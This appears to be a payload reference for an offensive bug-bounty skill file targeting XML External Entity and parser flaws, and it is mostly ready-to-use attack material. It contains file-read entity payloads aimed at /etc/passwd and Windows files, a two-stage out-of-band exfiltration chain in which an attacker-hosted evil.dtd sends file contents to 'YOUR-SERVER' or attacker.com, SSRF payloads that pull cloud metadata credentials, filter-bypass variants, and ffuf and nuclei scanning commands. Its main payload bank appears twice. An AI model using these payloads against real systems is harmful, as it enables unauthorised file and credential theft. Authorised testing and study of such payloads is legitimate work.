# Payloads — XML External Entity and Parser Flaws

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Curated payload bank (from the HackerOne corpus)

### Classic file read

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
```

### Parameter entities / OOB

```text
<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
```

### SSRF / cloud metadata

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
```

### XInclude / SVG / Office

```text
<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
```

### Filter bypass

```text
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
```

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# XXE — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`

- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`

- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`

- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`



## Payload bank



**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Classic file read



```text

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>

```



### Parameter entities / OOB



```text

<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>

<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>

<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>

<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>

```



### SSRF / cloud metadata



```text

<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>

```



### XInclude / SVG / Office



```text

<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>

<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>

```



### Filter bypass



```text

<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>

<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)

- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |

| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |

| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |

| 2× | `%eval` |

| 2× | `Content-Type: application/xml;charset=UTF-8` |

| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |

| 2× | `<!DOCTYPE foo [` |

| 2× | `<params>` |

| 2× | `<offset>0</offset>` |

| 2× | `<queryParams>` |

| 2× | `<query>&xxe;</query>` |

| 2× | `<sortBy>relevance</sortBy>` |

| 2× | `<fieldList>["id", "title"]</fieldList>` |

| 2× | `</queryParams>` |

| 2× | `<source>marketplace</source>` |

| 2× | `<rows>5</rows>` |

| 2× | `</params>` |

| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |

| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |

| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |



## Parameters observed



`debug` · `status` · `type` · `top-text` · `bottom-text` · `id` · `_hxpage` · `max_file_size_kb` · `allow_file_type_list` · `EventAction` · `EventDate` · `url` · `RelayState` · `method` · `dl`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |

| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |

| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Point at XML/SOAP/SAML/SVG/office upload endpoints.



```sh

nuclei -u https://target -tags xxe \

       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \

       -rl 40 -o nuclei_xxe_xxe.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_xxe_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Error-based exfil via local-DTD repurposing (zero network egress)

When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:

```xml

<!DOCTYPE foo [

  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!ENTITY % ISOamso '

    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">

    %eval; %err;'>

  %local_dtd; ]>

```

Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)



### Classic In-Band File Read

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<root><data>&xxe;</data></root>

```



### Windows Equivalent

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

]>

<root><data>&xxe;</data></root>

```



### Blind OOB — DNS/HTTP Callback

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">

]>

<root><data>&xxe;</data></root>

```



### Blind OOB — File Exfiltration via Parameter Entity (two-stage)

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY % file SYSTEM "file:///etc/passwd">

  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">

  %dtd;

]>

<root><data>trigger</data></root>

```



**evil.dtd (hosted on attacker server):**

```xml

<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">

%all;

```



### SSRF via XXE (AWS Metadata)

```xml

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [

  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

]>

<root><data>&ssrf;</data></root>

```



### SVG XXE (for file upload endpoints)

```xml

<?xml version="1.0" standalone="yes"?>

<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>

<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">

  <text font-size="14" x="0" y="16">&xxe;</text>

</svg>

```



### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`

```xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>

```



### Content-Type Swap (JSON to XML)

```bash

# Original JSON request

curl -X POST https://target.com/api/endpoint \

  -H "Content-Type: application/json" \

  -d '{"user":"test"}'



# Converted to XML for XXE testing

curl -X POST https://target.com/api/endpoint \

  -H "Content-Type: application/xml" \

  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'

```



### Grep Patterns for Source Code Review

```bash

# PHP

grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .



# Java

grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .



# Python

grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .



# Look for missing hardening

grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .

```



---
